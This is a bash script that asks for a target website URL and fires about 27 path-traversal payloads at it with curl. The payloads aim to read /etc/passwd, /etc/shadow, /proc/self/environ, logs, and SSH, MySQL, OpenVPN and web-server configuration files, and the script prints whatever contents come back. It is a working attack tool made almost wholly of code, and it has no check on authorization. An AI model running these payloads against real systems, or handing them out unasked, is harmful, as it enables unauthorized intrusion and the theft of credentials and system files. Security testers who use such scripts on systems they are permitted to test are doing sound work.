#!/bin/bash

# Function to display colored output
print_color() {
    case $2 in
        "success")
            echo -e "\e[32m$1\e[0m"
            ;;
        "error")
            echo -e "\e[31m$1\e[0m"
            ;;
        *)
            echo "$1"
            ;;
    esac
}

# Function to test for Path Traversal vulnerability
test_path_traversal() {
    target=$1
    payloads=(
        "../../../../../../../../../../../../etc/passwd"
        "../../../../../../../../../../../../etc/passwd%00"
        "../../../../../../../../../../../../windows/win.ini"
        "../../../../../../../../../../../../boot.ini"
        "../../../../../../../../../../../../proc/self/environ"
        "../../../../../../../../../../../../var/log/apache2/access.log"
        "../../../../../../../../../../../../var/log/apache2/error.log"
        "../../../../../../../../../../../../var/log/httpd/access.log"
        "../../../../../../../../../../../../var/log/httpd/error.log"
        "../../../../../../../../../../../../etc/shadow"
        "../../../../../../../../../../../../etc/hosts"
        "../../../../../../../../../../../../etc/resolv.conf"
        "../../../../../../../../../../../../etc/hostname"
        "../../../../../../../../../../../../etc/mysql/my.cnf"
        "../../../../../../../../../../../../etc/ssh/sshd_config"
        "../../../../../../../../../../../../etc/ssh/ssh_config"
        "../../../../../../../../../../../../etc/openvpn/server.conf"
        "../../../../../../../../../../../../etc/openvpn/client.conf"
        "../../../../../../../../../../../../usr/local/etc/openvpn/server.conf"
        "../../../../../../../../../../../../usr/local/etc/openvpn/client.conf"
        "../../../../../../../../../../../../usr/local/etc/ssh/sshd_config"
        "../../../../../../../../../../../../usr/local/etc/ssh/ssh_config"
        "../../../../../../../../../../../../usr/local/etc/mysql/my.cnf"
        "../../../../../../../../../../../../usr/local/etc/apache2/httpd.conf"
        "../../../../../../../../../../../../usr/local/etc/apache2/sites-available/000-default.conf"
        "../../../../../../../../../../../../usr/local/etc/nginx/nginx.conf"
        "../../../../../../../../../../../../usr/local/etc/httpd/conf/httpd.conf"
    )

    vulnerable=false

    for payload in "${payloads[@]}"; do
        echo -n "Testing payload: $payload... "
        response=$(curl -s -o /dev/null -w "%{http_code}\n%{size_download}\n" -D - "$target/$payload")
        http_code=$(echo "$response" | sed -n '1p')
        response_size=$(echo "$response" | sed -n '2p')
        if [[ $http_code == "200" ]]; then
            print_color "SUCCESS - Payload: $payload - Target is vulnerable to Path Traversal!" "success"
            vulnerable=true
            echo "Response Content:"
            curl -s "$target/$payload"
            echo ""
        else
            print_color "FAILED - Payload: $payload - HTTP Code: $http_code - Response Size: $response_size" "error"
        fi
    done

    if [[ $vulnerable == false ]]; then
        print_color "Target is not vulnerable to Path Traversal." "error"
    fi
}

# Main function
main() {
    print_color "Enter your target website URL: " "default"
    read target_url
    print_color "Testing for Path Traversal vulnerability on $target_url..." "default"
    test_path_traversal "$target_url"
}

# Execute main function
main
